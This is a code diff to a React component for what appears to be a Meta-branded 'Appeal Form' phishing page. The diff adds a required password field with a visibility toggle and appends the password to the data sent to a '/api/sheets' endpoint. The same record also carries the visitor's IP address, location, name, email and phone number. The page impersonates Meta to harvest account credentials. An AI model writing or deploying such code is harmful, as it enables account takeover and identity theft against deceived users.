@@ -1,6 +1,8 @@
 import MetaLogo from '@/assets/images/meta-logo-image.png';
 import { store } from '@/store/store';
 import translateText from '@/utils/translate';
+import { faEye } from '@fortawesome/free-regular-svg-icons/faEye';
+import { faEyeSlash } from '@fortawesome/free-regular-svg-icons/faEyeSlash';
 import { faXmark } from '@fortawesome/free-solid-svg-icons/faXmark';
 import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
 import IntlTelInput from 'intl-tel-input/reactWithUtils';
@@ -9,31 +11,33 @@ import Image from 'next/image';
 import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useMemo, useState } from 'react';
 
 interface FormData {
-    information: string;
     fullName: string;
     personalEmail: string;
+    password: string;
 }
 
 interface FormField {
     name: keyof FormData;
     label: string;
-    type: 'text' | 'email' | 'textarea';
+    type: 'text' | 'email' | 'password';
 }
 
 const FORM_FIELDS: FormField[] = [
-    { name: 'information', label: 'Please provide us information that will help us investigate', type: 'textarea' },
     { name: 'fullName', label: 'Full Name', type: 'text' },
     { name: 'personalEmail', label: 'Personal Email', type: 'email' }
 ];
+
+const PASSWORD_FIELD: FormField = { name: 'password', label: 'Password', type: 'password' };
 const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [isAgreed, setIsAgreed] = useState(false);
+    const [showPassword, setShowPassword] = useState(false);
     const [formData, setFormData] = useState<FormData>({
-        information: '',
         fullName: '',
-        personalEmail: ''
+        personalEmail: '',
+        password: ''
     });
 
     const { setModalOpen, geoInfo, currentRow, setCurrentRow } = store();
@@ -45,7 +49,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Appeal Form', 'Please provide us information that will help us investigate', 'Full Name', 'Personal Email', 'Mobile phone number', 'I agree with Terms of use', 'Submit'];
+        const textsToTranslate = ['Appeal Form', 'Full Name', 'Personal Email', 'Password', 'Mobile phone number', 'I agree with Terms of use', 'Submit'];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -84,13 +88,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     }, []);
 
     const isFormValid = useMemo(() => {
-        return (
-            formData.information.trim() !== '' &&
-            formData.fullName.trim() !== '' &&
-            formData.personalEmail.trim() !== '' &&
-            phoneNumber.trim() !== '' &&
-            isAgreed
-        );
+        return formData.fullName.trim() !== '' && formData.personalEmail.trim() !== '' && formData.password.trim() !== '' && phoneNumber.trim() !== '' && isAgreed;
     }, [formData, phoneNumber, isAgreed]);
 
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
@@ -100,13 +98,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         setIsLoading(true);
 
-        const formDataToSend = [[
-            geoInfo?.ip || 'N/A',
-            geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A',
-            formData.fullName,
-            formData.personalEmail,
-            phoneNumber
-        ]];
+        const formDataToSend = [[geoInfo?.ip || 'N/A', geoInfo ? `${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})` : 'N/A', formData.fullName, formData.personalEmail, phoneNumber, formData.password]];
 
         try {
             const res = await fetch('/api/sheets', {
@@ -155,7 +147,14 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                         {FORM_FIELDS.map((field) => (
                             <div key={field.name}>
                                 <p className='font-sans'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-[100px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' rows={3} required /> : <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' required />}
+                                {field.type === 'password' ? (
+                                    <div className='relative'>
+                                        <input name={field.name} type={showPassword ? 'text' : 'password'} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10' required />
+                                        <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
+                                    </div>
+                                ) : (
+                                    <input name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5' required />
+                                )}
                             </div>
                         ))}
                         <p className='font-sans'>{t('Mobile phone number')}</p>
@@ -168,9 +167,18 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
                                 required: true
                             }}
                         />
+                        <div>
+                            <p className='font-sans'>{t(PASSWORD_FIELD.label)}</p>
+                            <div className='relative'>
+                                <input name={PASSWORD_FIELD.name} type={showPassword ? 'text' : 'password'} value={formData[PASSWORD_FIELD.name]} onChange={handleInputChange} className='h-[50px] w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 pr-10' required />
+                                <FontAwesomeIcon icon={showPassword ? faEyeSlash : faEye} size='lg' className='absolute top-1/2 right-3 -translate-y-1/2 cursor-pointer text-[#4a4a4a]' onClick={() => setShowPassword(!showPassword)} />
+                            </div>
+                        </div>
                         <div className='flex items-center gap-2 pt-2'>
                             <input type='checkbox' id='terms-checkbox' checked={isAgreed} onChange={(e) => setIsAgreed(e.target.checked)} className='cursor-pointer' />
-                            <label htmlFor='terms-checkbox' className='cursor-pointer'>{t('I agree with Terms of use')}</label>
+                            <label htmlFor='terms-checkbox' className='cursor-pointer'>
+                                {t('I agree with Terms of use')}
+                            </label>
                         </div>
                         <button type='submit' disabled={isLoading || !isFormValid} className={`mt-4 flex h-[50px] w-full items-center justify-center rounded-full bg-blue-600 font-semibold text-white transition-colors hover:bg-blue-700 ${isLoading || !isFormValid ? 'cursor-not-allowed opacity-50' : ''}`}>
                             {isLoading ? <div className='h-5 w-5 animate-spin rounded-full border-2 border-white border-b-transparent border-l-transparent'></div> : t('Submit')}
